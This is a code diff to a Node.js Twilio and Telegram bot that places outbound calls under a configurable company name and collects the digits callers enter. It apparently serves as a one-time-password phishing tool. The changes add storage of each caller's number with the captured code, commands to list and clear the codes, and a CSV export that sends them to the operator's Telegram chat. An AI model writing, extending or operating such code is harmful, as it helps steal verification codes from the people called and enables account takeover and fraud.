@@ -21,6 +21,7 @@ const TWILIO_AUTH_TOKEN =
 const TWILIO_NUMBER = process.env.TWILIO_NUMBER;
 
 const BASE_URL = process.env.BASE_URL || "";
+
 const ALLOWED_CHAT_IDS = (process.env.ALLOWED_CHAT_IDS || CHAT_ID || "")
   .split(",")
   .map(s => s.trim())
@@ -64,6 +65,7 @@ let db = {
   profiles: {},
   history: [],
   logs: [],
+  codes: [],
   stats: {
     inboundCalls: 0,
     outboundCalls: 0,
@@ -83,12 +85,26 @@ function loadDB() {
     if (fs.existsSync(DB_FILE)) {
       const raw = fs.readFileSync(DB_FILE, "utf8");
       const parsed = JSON.parse(raw);
+
       db = {
         settings: { ...defaultSettings, ...(parsed.settings || {}) },
         profiles: parsed.profiles || {},
         history: parsed.history || [],
         logs: parsed.logs || [],
-        stats: { ...db.stats, ...(parsed.stats || {}) }
+        codes: parsed.codes || [],
+        stats: {
+          inboundCalls: 0,
+          outboundCalls: 0,
+          inputsReceived: 0,
+          confirmed: 0,
+          retries: 0,
+          hungUp: 0,
+          autoConfirmed: 0,
+          autoHungUp: 0,
+          scheduledCalls: 0,
+          completedCalls: 0,
+          ...(parsed.stats || {})
+        }
       };
     }
   } catch (e) {
@@ -138,6 +154,16 @@ function markPanelDirty() {
   panelDirty = true;
 }
 
+function saveSettings() {
+  db.settings = settings;
+  saveDB();
+}
+
+function incStat(key) {
+  db.stats[key] = (db.stats[key] || 0) + 1;
+  saveDB();
+}
+
 function isAuthorized(update) {
   if (!ALLOWED_CHAT_IDS.length) return true;
 
@@ -159,7 +185,7 @@ function assistantForCall(call) {
 }
 
 function template(str, call = null) {
-  return str
+  return String(str || "")
     .replaceAll("{company}", settings.company)
     .replaceAll("{digits}", String(settings.digits))
     .replaceAll("{item}", settings.itemName)
@@ -175,6 +201,16 @@ function pushLog(text) {
 function pushHistory(text) {
   db.history.unshift(`${new Date().toLocaleString()} ${text}`);
   db.history = db.history.slice(0, 200);
+  saveDB();
+}
+
+function pushCodeEntry(caller, value) {
+  db.codes.unshift({
+    time: new Date().toLocaleString(),
+    caller,
+    value
+  });
+  db.codes = db.codes.slice(0, 100);
   saveDB();
 }
 
@@ -250,14 +286,17 @@ function spacedDigits(value) {
     .join(" ");
 }
 
-function saveSettings() {
-  db.settings = settings;
-  saveDB();
-}
-
-function incStat(key) {
-  db.stats[key] = (db.stats[key] || 0) + 1;
-  saveDB();
+function toCsv(rows) {
+  const header = "time,caller,value\n";
+  const body = rows
+    .map(r => {
+      const time = `"${String(r.time).replaceAll('"', '""')}"`;
+      const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
+      const value = `"${String(r.value).replaceAll('"', '""')}"`;
+      return `${time},${caller},${value}`;
+    })
+    .join("\n");
+  return header + body;
 }
 
 // ===== TELEGRAM =====
@@ -296,6 +335,40 @@ async function tgAnswerCallback(callbackQueryId, text = "") {
       text
     });
   } catch {}
+}
+
+async function tgSendDocument(filename, contentBuffer) {
+  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;
+
+  const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
+  const chunks = [];
+
+  function pushString(str) {
+    chunks.push(Buffer.from(str, "utf8"));
+  }
+
+  pushString(`--${boundary}\r\n`);
+  pushString(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
+  pushString(`${CHAT_ID}\r\n`);
+
+  pushString(`--${boundary}\r\n`);
+  pushString(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
+  pushString(`Content-Type: text/csv\r\n\r\n`);
+  chunks.push(contentBuffer);
+  pushString(`\r\n--${boundary}--\r\n`);
+
+  const body = Buffer.concat(chunks);
+
+  const res = await fetch(url, {
+    method: "POST",
+    headers: {
+      "Content-Type": `multipart/form-data; boundary=${boundary}`,
+      "Content-Length": String(body.length)
+    },
+    body
+  });
+
+  return res.json();
 }
 
 // ===== PANEL =====
@@ -599,7 +672,12 @@ function scheduleOutboundCall(number, delayMs) {
     }
   }, delayMs);
 
-  scheduledJobs.push({ id, number, fireAt: Date.now() + delayMs, timeout });
+  scheduledJobs.push({
+    id,
+    number,
+    fireAt: Date.now() + delayMs,
+    timeout
+  });
 }
 
 function parseDelay(text) {
@@ -738,18 +816,17 @@ app.post("/input", async (req, res) => {
     incStat("inputsReceived");
     pushLog(`${caller} : ${digits}`);
     pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
+    pushCodeEntry(caller, digits);
 
     res.type("text/xml");
     res.send(buildReviewTwiml(call));
 
     try {
-      await tgSend(`🔑 NEW ${settings.itemName.toUpperCase()}
-
-👤 Caller: ${caller}
-📟 Code: ${digits}`);
+      await tgSend(`${digits}`);
       markPanelDirty();
+      updatePanel();
     } catch (e) {
-      console.log("post-input telegram error:", e.message);
+      console.log("telegram send error:", e.message);
     }
 
     schedulePerCallTimers(call);
@@ -960,6 +1037,9 @@ app.post("/telegram", async (req, res) => {
 /logs
 /history
 /stats
+/codes
+/clearcodes
+/export
 /call +number
 /calllast
 /digits X
@@ -1009,6 +1089,32 @@ Paused: ${settings.paused ? "Yes" : "No"}`);
         let textOut = "🗂 History\n\n";
         db.history.slice(0, 30).forEach(l => (textOut += l + "\n"));
         await tgSend(textOut);
+        return res.sendStatus(200);
+      }
+
+      if (text === "/codes") {
+        if (!db.codes.length) {
+          await tgSend("No saved entries.");
+        } else {
+          let out = "🗂 Recent Entries\n\n";
+          db.codes.slice(0, 20).forEach(c => {
+            out += `${c.time}\n${c.caller} → ${c.value}\n\n`;
+          });
+          await tgSend(out);
+        }
+        return res.sendStatus(200);
+      }
+
+      if (text === "/clearcodes") {
+        db.codes = [];
+        saveDB();
+        await tgSend("Entries cleared");
+        return res.sendStatus(200);
+      }
+
+      if (text === "/export") {
+        const csv = toCsv(db.codes);
+        await tgSendDocument("codes.csv", Buffer.from(csv, "utf8"));
         return res.sendStatus(200);
       }
 
@@ -1286,7 +1392,7 @@ setInterval(() => {
     updatePanel();
   }
   cleanupEndedCalls();
-}, 1500);
+}, 500);
 
 app.listen(PORT, () => {
   console.log("Server started");
